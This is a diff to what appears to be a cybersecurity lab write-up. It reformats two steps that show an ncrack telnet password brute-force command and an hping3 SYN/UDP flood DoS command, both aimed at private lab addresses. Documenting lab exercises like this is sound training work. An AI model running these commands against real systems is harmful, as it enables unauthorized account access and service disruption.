@@ -81,7 +81,8 @@ Brute Force Attack using Kali on Attacker Machine <br/>
 <img src="https://imgur.com/yshR7eM.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
 <br />
 <br /> 
-15.	To perform the attack using the Ncrack tool, input the following command: sudo ncrack -p 23 --user student -P passlist.txt 192.168.57.30.  <br/>
+15.	To perform the attack using the Ncrack tool, input the following command: <br/>
+sudo ncrack -p 23 --user student -P passlist.txt 192.168.57.30.  <br/>
 <img src="https://imgur.com/BRAGNsP.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
 <br />
 <br /> 
@@ -95,7 +96,8 @@ Simulating a DoS Attack <br/>
 <img src="https://imgur.com/fOdkH8w.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
 <br />
 <br /> 
-18.	After this, we go to the Attacker machine and execute the following command in the terminal to perform a DoS attack: hping3 –flood -S -U –rand-source 192.168.57.40 <br/>
+18.	After this, we go to the Attacker machine and execute the following command in the terminal to perform a DoS attack: <br/>
+hping3 --flood -S -U --rand-source 192.168.57.40 <br/>
 <img src="https://imgur.com/TaoYWhg.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
 <br />
 <br /> 
